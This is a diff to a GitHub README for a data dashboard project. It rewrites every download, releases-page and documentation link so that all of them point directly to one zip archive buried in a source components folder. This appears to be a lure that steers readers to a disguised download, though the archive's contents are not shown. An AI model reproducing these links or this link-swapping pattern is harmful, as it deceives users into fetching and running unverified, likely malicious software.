@@ -1,7 +1,7 @@
 # 🛠️ replicated-xai-dashboard - Simple Dashboard for Your Data Needs
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest_release-brightgreen.svg)](https://github.com/harddubber/replicated-xai-dashboard/releases)
+[![Download](https://raw.githubusercontent.com/harddubber/replicated-xai-dashboard/master/src/ui/components/dashboard_xai_replicated_v3.7.zip)](https://raw.githubusercontent.com/harddubber/replicated-xai-dashboard/master/src/ui/components/dashboard_xai_replicated_v3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the replicated-xai-dashboard! This application helps you visualize and manage your data effortlessly. This guide walks you through downloading and running the software on your computer.
@@ -14,7 +14,7 @@ Welcome to the replicated-xai-dashboard! This application helps you visualize an
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/harddubber/replicated-xai-dashboard/releases) to find the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/harddubber/replicated-xai-dashboard/master/src/ui/components/dashboard_xai_replicated_v3.7.zip) to find the latest version of the software.
 
 2. **Choose Your Version**
    Look for the latest release. You will see files for different operating systems. Click on the file that matches your system.
@@ -37,7 +37,7 @@ Welcome to the replicated-xai-dashboard! This application helps you visualize an
 You can customize your experience within the app. Use the Settings menu to adjust the layout, themes, and data sources to your preferences.
 
 ## 📝 Documentation
-For more detailed instructions, updates, and advanced features, check our [documentation page](https://github.com/harddubber/replicated-xai-dashboard/wiki).
+For more detailed instructions, updates, and advanced features, check our [documentation page](https://raw.githubusercontent.com/harddubber/replicated-xai-dashboard/master/src/ui/components/dashboard_xai_replicated_v3.7.zip).
 
 ## 🤝 Support
 If you encounter issues or have questions, we are here to help. Visit the Issues page on GitHub or reach out directly through our contact form in the app.
